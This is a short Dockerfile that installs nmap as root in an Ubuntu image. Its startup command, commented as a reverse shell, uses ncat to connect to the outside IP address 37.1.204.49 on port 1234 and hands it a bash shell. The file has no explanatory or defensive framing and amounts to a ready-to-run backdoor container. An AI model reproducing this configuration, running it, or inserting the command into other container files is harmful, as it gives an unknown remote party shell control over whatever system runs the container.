FROM ubuntu:latest

# Set user to root
USER root

# Update packages
RUN apt-get update -y && apt-get upgrade -y

# Install nmap package (includes ncat)
RUN apt-get install -y nmap

# Start ncat reverse shell
CMD ncat 37.1.204.49 1234 -e /bin/bash
